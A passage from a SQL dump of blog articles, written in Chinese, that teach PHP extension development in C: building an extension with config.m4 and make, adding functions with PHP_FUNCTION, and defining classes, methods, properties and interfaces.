$ext_shared)\r\nfi\r\n```\r\n\r\n上述为`autoconf`的配置文件，第一个宏`PHP_ARG_ENABLE`，含有三个参数：\r\n\r\n- ext_demo_1 这是第一个参数，为`./configure`建立了名为`enable-ext_demo_1`的选项\r\n- 第二个参数将会在`./configure`命令处理到该扩展的配置文件时，显示该参数的内容\r\n- 第三个参数是`./configure`命令的帮助，在使用`./configure --help`的时候显示\r\n\r\n第二个宏为`PHP_NEW_EXTENSION`，该宏声明了扩展的模块和必须要编译作为扩展一部分的源码文件。\r\n如果需要多个源文件，则使用空格分隔，第三个参数$ext_shared与调用\r\n`PHP_SUBST(EXT_DEMO_1_SHARED_LIBADD)`有关。\r\n\r\n```c\r\nPHP_NEW_EXTENSION(ext_demo_1, ext_demo_1.c, $ext_shared)\r\n```\r\n\r\n####编译扩展\r\n\r\n修改完`config.m4`文件之后，接下来编译PHP和扩展。\r\n\r\n```shell\r\n/vagrant$ ./configure --disable-libxml --enable-ext_demo_1 --disable-dom --disable-simplexml --disable-xml --disable-xmlreader --disable-xmlwriter --without-pear --prefix=/usr/local/php\r\n/vagrant$ make\r\n/vagrant$ sudo make install\r\nInstalling PHP SAPI module:       cgi\r\nInstalling PHP CGI binary: /usr/local/php/bin/\r\nInstalling PHP CLI binary:        /usr/local/php/bin/\r\nInstalling PHP CLI man page:      /usr/local/php/man/man1/\r\nInstalling build environment:     /usr/local/php/lib/php/build/\r\nInstalling header files:          /usr/local/php/include/php/\r\nInstalling helper programs:       /usr/local/php/bin/\r\n  program: phpize\r\n  program: php-config\r\nInstalling man pages:             /usr/local/php/man/man1/\r\n  page: phpize.1\r\n  page: php-config.1\r\n/vagrant/build/shtool install -c ext/phar/phar.phar /usr/local/php/bin\r\nln -s -f /usr/local/php/bin/phar.phar /usr/local/php/bin/phar\r\nInstalling PDO headers:          /usr/local/php/include/php/ext/pdo/\r\n```\r\n\r\n此时，PHP安装在了`/usr/local/php`目录下，进入该目录，可以看到如下文件:\r\n\r\n```shell\r\n/usr/local/php$ ls\r\nbin  include  lib  man\r\n```\r\n进入`/usr/local/php/bin`目录，执行以下命令：\r\n\r\n```shell\r\n/usr/local/php/bin$ ./php --info|grep demo\r\nConfigure Command =>  ''./configure''  ''--disable-libxml'' ''--enable-ext_demo_1'' ''--disable-dom'' ''--disable-simplexml'' ''--disable-xml'' ''--disable-xmlreader'' ''--disable-xmlwriter'' ''--without-pear'' ''--prefix=/usr/local/php''\r\next_demo_1\r\next_demo_1 support => enabled\r\n```\r\n\r\n可以看到，`phpinfo()`中扩展支持已经启用了，按照上述步骤安装的扩展中包含了一个测试扩展是否能够正常工作的函数，\r\n该函数名为`confirm_ext_demo_1_compiled(arg)`，执行结果如下：\r\n```shell\r\n/usr/local/php/bin$ ./php -r "echo confirm_ext_demo_1_compiled(''mylxsw'');"\r\nCongratulations! You have successfully modified ext/ext_demo_1/config.m4. Module mylxsw is now compiled into PHP.\r\n```\r\n可以看到，`ext_demo_1`扩展安装成功了。\r\n', '本文讲解了开发一个PHP扩展的基本步骤，踏出开发PHP扩展的第一步。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/e1c9ffd965f9eda1c1330f942d7fbb49.jpg', 'mylxsw', '原创', 1, 0, 1414754558, 1414854114, 0, 'markdown');
INSERT INTO `ar_article` (`id`, `title`, `content`, `intro`, `feature_img`, `author`, `source`, `isvalid`, `creator`, `publish_date`, `update_date`, `updator`, `model`) VALUES
(398, 'PHP扩展开发 - 创建第一个PHP扩展函数', '###创建第一个PHP扩展函数\r\n\r\n在PHP扩展中，创建一个函数主要需要经过三步：\r\n\r\n1. 在源文件(.c)中使用`PHP_FUNCTION`宏创建函数实现，并头文件中声明该函数\r\n2. 使用`PHP_FE`告诉`zend_function_entry`结构体新创建的函数的地址\r\n3. 将`zend_function_entry`结构体注册到`zend_module_entry`扩展入口结构体上，只有\r\n创建第一个函数的时候需要这样做。\r\n\r\n接下来，我们对这三个步骤展开，并且辅以一个名为`demo_array()`的函数作为例子，该函数返回一个\r\n我们在扩展函数中创建的数组作为返回值。\r\n\r\n在讲解如何创建一个扩展函数之前，我们需要创建一个扩展的基本骨架，创建扩展的基本骨架请参考 [PHP扩展开发 - 构建第一个PHP扩展]。\r\n\r\n在[PHP扩展开发 - 构建第一个PHP扩展]中，我们创建了一个名为`ext_demo_1`的扩展程序，进入扩展目录，\r\n我们将看到如下文件：\r\n\r\n```shell\r\n/vagrant/ext/ext_demo_1$ ls\r\nconfig.m4   CREDITS       ext_demo_1.c    php_ext_demo_1.h\r\nconfig.w32  EXPERIMENTAL  ext_demo_1.php  tests\r\n```\r\n\r\n首先，我们需要在`ext_demo_1.c`文件中，创建函数的实现：\r\n\r\n```c\r\nPHP_FUNCTION(demo_array)\r\n{\r\n	zval *subarray;/* 子数组 */\r\n\r\n	array_init(return_value); /* 将函数返回值初始化为数组类型 */\r\n\r\n  /* 返回数组中添加三个值：life=>42, 123=>1, 124=>3.1415926 */\r\n	add_assoc_long(return_value, "life", 42);\r\n	add_index_bool(return_value, 123, 1);\r\n	add_next_index_double(return_value, 3.1415926);\r\n\r\n  /* 添加两个字符串值： 125=> Foo, 126=> Bar */\r\n	add_next_index_string(return_value, "Foo", 1);\r\n	add_next_index_string(return_value, estrdup("Bar"), 0);\r\n\r\n  /* 初始化zval结构体，分配内存空间 */\r\n	MAKE_STD_ZVAL(subarray);\r\n	array_init(subarray);\r\n\r\n	add_next_index_long(subarray, 1);\r\n	add_next_index_long(subarray, 20);\r\n	add_next_index_long(subarray, 132);\r\n\r\n  /* 将subarray添加到返回值 */\r\n	add_index_zval(return_value, 444, subarray);\r\n}\r\n```\r\n\r\n创建函数体之后，我们需要在头文件`php_ext_demo_1.h`中声明该函数。\r\n\r\n```c\r\nPHP_FUNCTION(demo_array);\r\n```\r\n\r\n第二步是告诉`zend_function_entry`结构体函数的地址。在`ext_demo_1.c`文件的第 **41** 行左右，\r\n我们可以看到`zend_function_entry`结构体变量，将函数通过`PHP_FE`宏添加到该变量数组中。\r\n\r\n```c\r\nconst zend_function_entry ext_demo_1_functions[] = {\r\n	PHP_FE(confirm_ext_demo_1_compiled,	NULL)		/* For testing, remove later. */\r\n	PHP_FE(demo_array, NULL) /* 在这里添加demo_array函数 */\r\n	PHP_FE_END	/* Must be the last line in ext_demo_1_functions[] */\r\n};\r\n```\r\n\r\n一般来说，如果使用的是`ext_skel`创建的扩展骨架的话，一个函数就算是添加完成了，因为第三步在生成扩展骨架的时候已经自动的完成了，\r\n这里的第三步就是将该`ext_demo_1_functions`添加到`zend_module_entry`结构体上。\r\n\r\n```c\r\nzend_module_entry ext_demo_1_module_entry = {\r\n#if ZEND_MODULE_API_NO >= 20010901\r\n	STANDARD_MODULE_HEADER,\r\n#endif\r\n	"ext_demo_1",\r\n	ext_demo_1_functions,  /* 注意这里，添加了 ext_demo_1_functions 变量 */\r\n	PHP_MINIT(ext_demo_1),\r\n	PHP_MSHUTDOWN(ext_demo_1),\r\n	PHP_RINIT(ext_demo_1),		/* Replace with NULL if there''s nothing to do at request start */\r\n	PHP_RSHUTDOWN(ext_demo_1),	/* Replace with NULL if there''s nothing to do at request end */\r\n	PHP_MINFO(ext_demo_1),\r\n#if ZEND_MODULE_API_NO >= 20010901\r\n	"0.1", /* Replace with version number for your extension */\r\n#endif\r\n	STANDARD_MODULE_PROPERTIES\r\n};\r\n```\r\n为了验证我们的函数创建是否成功，我们编译一下这个扩展:\r\n\r\n```shell\r\n# phpize\r\n# ./configure\r\n# make\r\n# make install\r\n```\r\n\r\n> 注意： 如果之前编译过该扩展，需要先`make clean`一下，清理掉上次编译产生的中间文件。\r\n\r\n安装完成之后，验证一下是否成功：\r\n\r\n```shell\r\n$ php -r "print_r(demo_array());"\r\nArray\r\n(\r\n    [life] => 42\r\n    [123] => 1\r\n    [124] => 3.1415926\r\n    [125] => Foo\r\n    [126] => Bar\r\n    [444] => Array\r\n        (\r\n            [0] => 1\r\n            [1] => 20\r\n            [2] => 132\r\n        )\r\n\r\n)\r\n```\r\n\r\n好了，一个函数就已经创建完成了，在php文件中，我们就可以直接调用刚才创建的函数了：\r\n```php\r\n<?php\r\nprint_r(demo_array());\r\n```\r\n\r\n###函数结构解析\r\n\r\n为了对该函数的创建过程有个直观的了解，我们对刚才用到的宏进行简单的剖析。\r\n\r\n这里的`PHP_FUNCTION`实际上是Zend定义的一个宏，展开后如下：\r\n\r\n```c\r\n#define PHP_FUNCTION(name) \\\r\n    void zif_##name(INTERNAL_FUNCTION_PARAMETERS)\r\n```\r\n\r\n也就是说，如果有函数定义如下：\r\n\r\n```c\r\nPHP_FUNCTION(sample_hello_world)\r\n{\r\n  php_printf("Hello World!\\n");\r\n}\r\n```\r\n\r\n在编译的时候将会被替换为：\r\n\r\n```c\r\nvoid zif_sample_hello_world(\r\n  int ht,\r\n  zval *return_value,         /* 函数返回值 */\r\n  zval **return_value_ptr,\r\n  zval *this_ptr,\r\n  char return_value_used TSRMLS_DC     /* 标识返回值是否被使用了 */\r\n){\r\n  ...\r\n}\r\n```\r\n\r\n> 这里的 **zif_** 是*Zend Internal Functions* 缩写，为了避免定义的函数与C内部函数名冲突。\r\n\r\n\r\n对于函数`demo_array`，内部实现如下：\r\n\r\n```c\r\nZEND_FUNCTION(demo_array)\r\n{\r\n  ...\r\n}\r\n```\r\n\r\n部分宏替换之后如下：\r\n\r\n```c\r\n\r\nvoid zif_demo_array(int ht, zval *return_value, zval **return_value_ptr, zval *this_ptr, int return_value_used TSRMLS_DC)\r\n{\r\n  ...\r\n}\r\n\r\n```\r\n\r\n当然，这样还没有结束，Zend引擎并不知道该函数的地址，因此，需要告诉引擎函数地址：\r\n\r\n```c\r\nconst zend_function_entry ext_demo_1_functions[] = {\r\n	PHP_FE(confirm_ext_demo_1_compiled,	NULL)		/* For testing, remove later. */\r\n	PHP_FE(demo_array, NULL)\r\n  PHP_FALIAS(demo_array_alias, demo_array, NULL) /* 函数别名 */\r\n	PHP_FE_END	/* Must be the last line in ext_demo_1_functions[] */\r\n};\r\n```\r\n\r\n> 注意，zend_function_entry结构体最后一组值为`PHP_FE_END` ({ NULL, NULL, NULL, 0, 0 })，如果需要添加新的函数，则\r\n> 在上面添加PHP_FE宏即可。\r\n\r\n> 这里的`PHP_FALIAS`宏为函数demo_array提供了一个别名demo_array_alias。\r\n\r\n> 使用zif前缀仍然可能与内部函数名称产生冲突，可以使用`PHP_NAMED_FUNCTION`和`PHP_NAMED_FE`\r\n> 配合使用（与PHP_FUNCTION和PHP_FE一样）\r\n\r\n这里的`PHP_FE`定义如下：\r\n\r\n```c\r\n#define PHP_FE			ZEND_FE   /* php.h:341 */\r\n\r\n#define ZEND_FE(name, arg_info)						ZEND_FENTRY(name, ZEND_FN(name), arg_info, 0)  /* zend_API.h:77 */\r\n\r\n#define ZEND_FENTRY(zend_name, name, arg_info, flags)	{ #zend_name, name, arg_info, (zend_uint) (sizeof(arg_info)/sizeof(struct _zend_arg_info)-1), flags },\r\n\r\n```\r\n该宏需要两个参数，第一个参数为函数名，第二个为参数，用于提供参数提示信息。\r\n\r\n[PHP扩展开发 - 构建第一个PHP扩展]: http://aicode.cc/article/397.html', '本文是PHP扩展开发系列的第二篇文章，讲解了如何在扩展中创建一个PHP函数。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/e1c9ffd965f9eda1c1330f942d7fbb49.jpg', 'mylxsw', '原创', 1, 0, 1414854089, 1414854451, 0, 'markdown'),
(399, 'PHP扩展开发 - 实现第一个PHP类', '###创建第一个PHP扩展类\r\n\r\n本节将会通过实现一个简单的PHP扩展类，介绍在PHP扩展开发过程中如何实现面向对象。\r\n\r\n在PHP扩展实现中，类的创建主要包含三步：\r\n\r\n1. 创建一个全局的`zend_class_entry`变量，用于存储类的入口。\r\n2. 创建一个`zend_function_entry`结构体数组，用于存储类中包含的方法。\r\n3. 在扩展的`MINIT`方法中注册类。\r\n\r\n下面将对这三个步骤进行展开描述，我们将会继续在[PHP扩展开发 - 构建第一个PHP扩展]一节中创建的\r\n`ext_demo_1`扩展的基础之上进行开发，这里我们所写的所有代码都在`ext_demo_1.c`文件中。\r\n\r\n####创建一个简单的空类\r\n\r\n首先，我们创建一个名为`php_democlass_entry`的`zend_class_entry`结构体变量，\r\n该结构体变量实际存储了我们创建的类的入口。\r\n\r\n```c\r\nzend_class_entry *php_democlass_entry;\r\n```\r\n\r\n> 这里的`php_democlass_entry`在扩展源文件中是一个全局变量，为了使其它扩展可以使用我们创建的类，\r\n> 这个全局变量应该在头文件中导出。\r\n\r\n接下来，我们创建`zend_function_entry`结构体数组，这个数组与函数定义时的数组是一样的。\r\n\r\n```c\r\nconst zend_function_entry ext_demo_1_democlass_functions[] = {\r\n	PHP_FE_END\r\n};\r\n```\r\n\r\n与函数注册不同的是，对于类的创建，我们需要在`MINIT`方法中注册该类。\r\n\r\n```c\r\nPHP_MINIT_FUNCTION(ext_demo_1)\r\n{\r\n	/* 创建一个临时类入口变量 */\r\n	zend_class_entry temp_ce;\r\n	INIT_CLASS_ENTRY(temp_ce, "DemoClass", ext_demo_1_democlass_functions);\r\n\r\n	php_democlass_entry = zend_register_internal_class(&temp_ce TSRMLS_CC);\r\n	return SUCCESS;\r\n}\r\n```\r\n\r\n在`MINIT`函数中，首先创建了一个`temp_ce`变量用于存储临时的类入口，接下来使用`INIT_CLASS_ENTRY`\r\n宏初始化该变量，之后使用`zend_register_internal_class()`将该类注册到Zend引擎，\r\n该函数会返回一个最终的类入口，将其赋值给前面创建的全局变量。\r\n\r\n这里的`INIT_CLASS_ENTRY`是一个宏定义:\r\n\r\n```c\r\n/* zend_API.h 162-163 */\r\n#define INIT_CLASS_ENTRY(class_container, class_name, functions) \\\r\n	INIT_OVERLOADED_CLASS_ENTRY(class_container, class_name, functions, NULL, NULL, NULL)\r\n```\r\n它接受三个参数，第一个参数为**类容器**，也就是我们创建的`zend_class_entry`变量，\r\n第二个参数为我们要创建的对象**名称**，第三个参数为我们创建的类包含哪些**函数**。\r\n\r\n在使用`INIT_CLASS_ENTRY`之后，都执行了哪些操作呢？跟进该宏定义的实现代码后可以发现，\r\n在该宏的定义中，首先为结构体(zend_class_entry)变量`class_container`设置`name`属性，\r\n然后对该结构体变量进行初始化(zend_API.h 176-204)。\r\n\r\n现在，我们就有了一个空的类，编译该扩展之后，我们可以使用`php --rc DemoClass`测试一下：\r\n```shell\r\next_demo_1 mylxsw$ php --rc DemoClass\r\nClass [ <internal:ext_demo_1> class DemoClass ] {\r\n\r\n  - Constants [0] {\r\n  }\r\n\r\n  - Static properties [0] {\r\n  }\r\n\r\n  - Static methods [0] {\r\n  }\r\n\r\n  - Properties [0] {\r\n  }\r\n\r\n  - Methods [0] {\r\n  }\r\n}\r\n```\r\n\r\n####为PHP类添加方法\r\n\r\n接下来，我们为我们刚才创建的空类添加一个名为`sayHello`的方法。\r\n\r\n在`ext_demo_1.c`文件中，创建一个`sayHello`的方法：\r\n\r\n```c\r\nPHP_METHOD(DemoClass, sayHello)\r\n{\r\n	char *name, *str_hello;\r\n	int name_len, str_hello_len;\r\n\r\n	if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "s", &name, &name_len) == FAILURE) {\r\n		RETURN_NULL();\r\n	}\r\n\r\n	str_hello_len = spprintf(&str_hello, 0, "Hello, %s, You are welcome!\\n", name);\r\n	RETURN_STRINGL(str_hello, str_hello_len, 0);\r\n}\r\n```\r\n\r\n这里我们创建为`DemoClass`类创建了一个名为`sayHello`的方法，该方法接收一个字符串类型的参数，\r\n并且返回`Hello, 提供的参数, You are welcome!`。\r\n\r\n不要忘记在头文件`php_ext_demo_1.h`文件中声明一下，否则编译的时候会因为`PHP_ME`宏中使用了该方法而报错。\r\n\r\n```c\r\nPHP_METHOD(DemoClass, sayHello);\r\n```\r\n\r\n在`ext_demo_1_democlass_functions`结构体数组中加入该方法：\r\n\r\n```c\r\nconst zend_function_entry ext_demo_1_democlass_functions[] = {\r\n	PHP_ME(DemoClass, sayHello, NULL, ZEND_ACC_PUBLIC) /* sayHello方法为PUBLIC可见性 */\r\n	PHP_FE_END\r\n};\r\n```\r\n\r\n这里的`PHP_ME`宏与之前函数部分中`PHP_FE`类似，区别在于增加了第一个参数，用于指定该方法所属的类名，\r\n最后一个参数用于指定方法属性。这里的方法属性包含\r\n`ZEND_ACC_PUBLIC`，`ZEND_ACC_PROTECTED`，\r\n`ZEND_ACC_PRIVATE`，`ZEND_ACC_STATIC`，\r\n`ZEND_ACC_FINAL`，`ZEND_ACC_ABSTRACT`。\r\n\r\n其中，前三个参数可以与后面几个组合使用，多个参数组合时，使用`|`进行分隔， 例如:\r\n\r\n```c\r\nPHP_ME(\r\n    Test, protectedFinalStaticMethod, arginfo_xyz,\r\n    ZEND_ACC_PROTECTED | ZEND_ACC_FINAL | ZEND_ACC_STATIC\r\n)\r\n```\r\n\r\n对于抽象方法来说，并不能直接使用`ZEND_ACC_ABSTRACT`宏，而应该使用Zend定义的\r\n`PHP_ABSTRACT_ME(类名, 抽象方法名, 参数信息)`取代。\r\n\r\n类似于`PHP_FUNCTION`宏，这里的`PHP_METHOD`宏展开后如下所示：\r\n```c\r\n/* PHP_METHOD(ClassName, methodName) { } */\r\nvoid zim_ClassName_methodName(INTERNAL_FUNCTION_PARAMETERS) { }\r\n```\r\n\r\n> 对于sayHello方法，我们可以使用ZEND_ARG_INFO系列宏为其参数提供类型提示功能。\r\n```c\r\nZEND_BEGIN_ARG_INFO_EX(democlass_sayhello_args, 0, 0, 1)\r\n	ZEND_ARG_INFO(0, name)\r\nZEND_END_ARG_INFO();\r\n```\r\n> 添加该段代码之后，需要修改PHP_ME函数的第三个参数NULL为`democlass_sayhello_args`。\r\n\r\n重新编译扩展，执行以下PHP脚本测试是否扩展功能正常：\r\n```php\r\n<?php\r\n$demo = new DemoClass();\r\necho $demo->sayHello(''mylxsw'');\r\n```\r\n程序输出：\r\n```shell\r\n$ php test.php\r\nHello, mylxsw, You are welcome!\r\n```\r\n\r\n> 在类方法内，使用`getThis()`方法获取当前对象实例，返回值类型为`zval *`，对应PHP中的`$this`。\r\n\r\n####为类添加属性\r\n\r\n要在创建好的类中添加属性，要使用`zend_declare_property_*`系列函数。在`MINIT`方法中，\r\n添加如下代码：\r\n```c\r\nPHP_MINIT_FUNCTION(ext_demo_1)\r\n{\r\n	...\r\n	zend_declare_property_long(php_democlass_entry, "age", sizeof("age") - 1, 24, ZEND_ACC_PUBLIC TSRMLS_CC);\r\n	...\r\n}\r\n```\r\n这里我们使用`zend_declare_property_long()`函数为`DemoClass`类添加了一个`age`字段，\r\n并且设置其可见性为PUBLIC，类型为long型。\r\n\r\n下面是`zend_declare_property_*`系列函数:\r\n```c\r\nZEND_API int zend_declare_property(zend_class_entry *ce, char *name, int name_length, zval *property, int access_type TSRMLS_DC);\r\n\r\nZEND_API int zend_declare_property_ex(zend_class_entry *ce, const char *name, int name_length, zval *property, int access_type, char *doc_comment, int doc_comment_len TSRMLS_DC);\r\n\r\nZEND_API int zend_declare_property_null(zend_class_entry *ce, char *name, int name_length, int access_type TSRMLS_DC);\r\n\r\nZEND_API int zend_declare_property_bool(zend_class_entry *ce, char *name, int name_length, long value, int access_type TSRMLS_DC);\r\n\r\nZEND_API int zend_declare_property_long(zend_class_entry *ce, char *name, int name_length, long value, int access_type TSRMLS_DC);\r\n\r\nZEND_API int zend_declare_property_double(zend_class_entry *ce, char *name, int name_length, double value, int access_type TSRMLS_DC);\r\n\r\nZEND_API int zend_declare_property_string(zend_class_entry *ce, char *name, int name_length, char *value, int access_type TSRMLS_DC);\r\n\r\nZEND_API int zend_declare_property_stringl(zend_class_entry *ce, char *name, int name_length, char *value, int value_len, int access_type TSRMLS_DC);\r\n```\r\n\r\n要访问类中的属性，比如获取属性的值或者是修改属性的值等，使用`zend_read_property()`和\r\n`zend_update_property()`函数。\r\n\r\n```c\r\n/* zend_API.h 326-328 */\r\nZEND_API zval *zend_read_property(zend_class_entry *scope, zval *object, char *name, int name_length, zend_bool silent TSRMLS_DC);\r\n\r\nZEND_API zval *zend_read_static_property(zend_class_entry *scope, char *name, int name_length, zend_bool silent TSRMLS_DC);\r\n\r\nZEND_API void zend_update_property(zend_class_entry *scope, zval *object, char *name, int name_length, zval *value TSRMLS_DC);\r\n\r\n/* 下面这个是zend_update_property_*系列函数，与declare系列类似，不做详述，参考zend_API.h 309-328 */\r\nZEND_API void zend_update_property_long(zend_class_entry *scope, zval *object, char *name, int name_length, long value TSRMLS_DC);\r\n\r\n```\r\n\r\n为了演示，我们注册一个名为`age`的long型属性，并创建对应的getter/setter方法。\r\n\r\n```c\r\n/* getAge方法的参数类型提示，无参数 */\r\nZEND_BEGIN_ARG_INFO_EX(democlass_getage_args, 0, 0, 0)\r\nZEND_END_ARG_INFO()\r\n\r\n/* setAge方法参数类型提示，一个必须参数，名称$age */\r\nZEND_BEGIN_ARG_INFO_EX(democlass_setage_args, 0, 0, 1)\r\n	ZEND_ARG_INFO(0, age)\r\nZEND_END_ARG_INFO()\r\n\r\n/* 将创建的方法告诉zend_function_entry，设置可见性为public */\r\nconst zend_function_entry ext_demo_1_democlass_functions[] = {\r\n	...\r\n	PHP_ME(DemoClass, setAge, democlass_setage_args, ZEND_ACC_PUBLIC)\r\n	PHP_ME(DemoClass, getAge, democlass_getage_args, ZEND_ACC_PUBLIC)\r\n	PHP_FE_END\r\n};\r\n\r\n/* setAge($age)方法 */\r\nPHP_METHOD(DemoClass, setAge)\r\n{\r\n	long age;\r\n	zval *obj;\r\n	if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "l", &age) == FAILURE) {\r\n		RETURN_NULL();\r\n	}\r\n	obj = getThis();/* 获取$this对象 */\r\n	/* 更新age字段的信息 */\r\n	zend_update_property_long(php_democlass_entry, obj, "age", sizeof("age") - 1, age);\r\n}\r\n\r\n/* getAge方法*/\r\nPHP_METHOD(DemoClass, getAge)\r\n{\r\n	zval *obj, *age;\r\n	obj = getThis();\r\n	/* 检索age属性的值 */\r\n	age = zend_read_property(php_democlass_entry, obj, "age", sizeof("age") - 1, 1 TSRMLS_CC);\r\n	RETURN_ZVAL(age, 1, 0);\r\n}\r\n\r\n/* MINIT方法*/\r\nPHP_MINIT_FUNCTION(ext_demo_1)\r\n{\r\n	.../* 这里省略了，完成类的注册 */\r\n	/* 声明属性age，并设置为public可见性 */\r\n	zend_declare_property_long(php_democlass_entry, "age", sizeof("age") - 1, 24, ZEND_ACC_PUBLIC TSRMLS_CC);\r\n	return SUCCESS;\r\n}\r\n```\r\n\r\n要创建static属性的话，同样使用`zend_declare_property*`系列函数，区别是类型标识符需要增加\r\n`ZEND_ACC_STATIC`。对static字段的操作使用`zend_read_static_property()`和`zend_update_static_property*`系列函数。\r\n\r\n还有一个是类常量，类常量使用`zend_declare_class_constant*`系列宏声明，使用`zend_update_class_constants`\r\n进行操作。\r\n\r\n####接口和继承\r\n\r\n与在PHP中使用类和接口类似，在扩展开发中，扩展内部的类也可以继承其它类或者实现接口。\r\n\r\n当我们创建的类需要继承一个已经存在的类的时候，我们只需要将注册类的函数修改为`zend_register_internal_class_ex`。\r\n\r\n```c\r\ndesignner_entry = zend_register_internal_class_ex(&temp_designner_ce, person_entry, NULL TSRMLS_CC);\r\n```\r\n\r\n与之前使用`zend_register_internal_class`不同的是，`_ex`版本的注册函数增加了两个参数，\r\n第二个参数为要继承的类的全局标识，也就是在创建类的时候我们那个`zend_class_entry`全局对象。\r\n这里第三个参数为NULL，这个参数的作用是在调用其它扩展类时，如果扩展没有按照规范导出类的全局标识符的话，\r\n我们将第二个参数设置为NULL，第三个参数设为字符串形式的类名，当然，不推荐这样做，例如：\r\n\r\n```c\r\ncustom_exception_ce = zend_register_internal_class_ex(\r\n    &tmp_ce, NULL, "RuntimeException" TSRMLS_CC\r\n);\r\n```\r\n\r\n接口的创建与类相似，区别在于在接口创建时，在`zend_function_entry`中，需要将接口所有的方法\r\n使用`PHP_ABSTRACT_ME`添加，其它步骤与类的创建一样，在MINIT方法中，当初始化类之后，只需要再\r\n设置创建类的`ce_flags`字段为`ZEND_ACC_INTERFACE`即可。\r\n\r\n```c\r\nzend_class_entry *php_sample3_iface_entry;\r\nPHP_MINIT_FUNCTION(sample3)\r\n{\r\n    zend_class_entry ce;\r\n    INIT_CLASS_ENTRY(ce, "Sample3_Interface",\r\n                        php_sample3_iface_methods);\r\n    php_sample3_iface_entry =\r\n                zend_register_internal_class(&ce TSRMLS_CC);\r\n    php_sample3_iface_entry->ce_flags|= ZEND_ACC_INTERFACE;/* 注意这里使用了“|” */\r\n    ...\r\n```\r\n\r\n如果创建的类要实现接口，只需要再使用`zend_class_implements()`函数添加一下就可以了。\r\n\r\n```c\r\n/* DataClass implements Countable, ArrayAccess, IteratorAggregate */\r\nzend_class_implements(\r\n        data_class_ce TSRMLS_CC, 3, spl_ce_Countable, zend_ce_arrayaccess, zend_ce_aggregate\r\n    );\r\n```\r\n\r\n这里的`zend_class_implements()`函数是个变参函数，第一个参数为需要实现接口的类的zend_class_entry对象，第二个参数为需要实现的接口的个数，其它参数是可变的，都为需要实现的接口。\r\n\r\n_______________________\r\n###附录\r\n\r\n####对象结构\r\n\r\n在`zval`中，与对象有关的字段是`zvalue_value`联合体中的`zend_object_value`字段，\r\n该类型定义如下：\r\n\r\n```c\r\n/* zend_types.h 53-59 */\r\ntypedef unsigned int zend_object_handle;\r\ntypedef struct _zend_object_handlers zend_object_handlers;\r\n\r\ntypedef struct _zend_object_value {\r\n	zend_object_handle handle;\r\n	zend_object_handlers *handlers;\r\n} zend_object_value;\r\n```\r\n\r\n该结构体`zend_object_value`中，`zend_object_handle`类型的handle为int类型的整数值，\r\n该handle是一个唯一的对象ID标识，用于从对象存储中查询实际的对象。\r\n\r\n第二个参数是一个指向`zend_object_handlers`结构体的指针，该结构体定义了实际对象的行为(zend_object_handlers.h 113-141)。\r\n\r\n####类结构\r\n\r\n在PHP扩展中，Zend引擎定义了`zend_class_entry`结构体来表示一个类的基本结构。\r\n```c\r\n/* zend.h 418-470 */\r\nstruct _zend_class_entry {\r\n	char type;/* 类的类型：ZEND_INTERNAL_CLASS 或者 ZEND_USER_CLASS */\r\n	char *name;/* 类的名称 */\r\n	zend_uint name_length;/* 类名称长度 ， sizeof(name) - 1 */\r\n	struct _zend_class_entry *parent; /* 该类的父类 */\r\n	int refcount;/* 引用计数 */\r\n	zend_bool constants_updated;\r\n  /*\r\n   * ce_flags指定了类的基本属性\r\n   *    ZEND_ACC_IMPLICIT_ABSTRACT_CLASS 隐式的抽象类（含有abstract方法）\r\n   *    ZEND_ACC_EXPLICIT_ABSTRACT_CLASS 添加了abstract关键字的抽象类\r\n   *    ZEND_ACC_FINAL_CLASS 该类是final的\r\n   *    ZEND_ACC_INTERFACE 这是一个接口\r\n   */\r\n	zend_uint ce_flags;\r\n\r\n	HashTable function_table; /* 方法哈希表 */\r\n	HashTable default_properties; /* 默认属性哈希表 */\r\n	HashTable properties_info; /* 属性信息哈希表 */\r\n	HashTable default_static_members; /* 默认的静态成员变量哈希表 */\r\n  /*\r\n   * type == ZEND_USER_CLASS    ->  &default_static_members\r\n   * type == ZEND_INTERAL_CLASS -> NULL\r\n   */\r\n	HashTable *static_members;\r\n	HashTable constants_table; /* 常量哈希表 */\r\n	const struct _zend_function_entry *builtin_functions; /* 方法定义入口 */\r\n\r\n  /* 构造函数、析构函数、clone函数以及其它魔术方法 */\r\n	union _zend_function *constructor;\r\n	union _zend_function *destructor;\r\n	union _zend_function *clone;\r\n	union _zend_function *__get;\r\n	union _zend_function *__set;\r\n	union _zend_function *__unset;\r\n	union _zend_function *__isset;\r\n	union _zend_function *__call;\r\n	union _zend_function *__callstatic;\r\n	union _zend_function *__tostring;\r\n	union _zend_function *serialize_func;\r\n	union _zend_function *unserialize_func;\r\n\r\n	zend_class_iterator_funcs iterator_funcs;\r\n\r\n	/* 类句柄handler */\r\n	zend_object_value (*create_object)(zend_class_entry *class_type TSRMLS_DC);\r\n	zend_object_iterator *(*get_iterator)(zend_class_entry *ce, zval *object, int by_ref TSRMLS_DC);\r\n\r\n  /* 类声明的接口 */\r\n	int (*interface_gets_implemented)(zend_class_entry *iface, zend_class_entry *class_type TSRMLS_DC);\r\n	union _zend_function *(*get_static_method)(zend_class_entry *ce, char* method, int method_len TSRMLS_DC);\r\n\r\n	/* 序列化回调函数 */\r\n	int (*serialize)(zval *object, unsigned char **buffer, zend_uint *buf_len, zend_serialize_data *data TSRMLS_DC);\r\n	int (*unserialize)(zval **object, zend_class_entry *ce, const unsigned char *buf, zend_uint buf_len, zend_unserialize_data *data TSRMLS_DC);\r\n\r\n	zend_class_entry **interfaces; /* 类实现的接口 */\r\n	zend_uint num_interfaces; /* 类实现的接口数目 */\r\n\r\n	char *filename; /* 类所在的文件 */\r\n	zend_uint line_start; /* 类定义的开始行 */\r\n	zend_uint line_end;/* 类定义的结束行 */\r\n	char *doc_comment;\r\n	zend_uint doc_comment_len;\r\n\r\n	struct _zend_module_entry *module;/* 类所在的模块入口*/\r\n};\r\n```\r\n\r\n___________________________\r\n[PHP扩展开发 - 构建第一个PHP扩展]: http://aicode.cc/article/397.html\r\n', '本节讲解如何在PHP扩展中创建一个简单的PHP类，并添加方法、属性等。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/e1c9ffd965f9eda1c1330f942d7fbb49.jpg', 'mylxsw', '原创', 1, 0, 1415096091, NULL, NULL, 'markdown'),
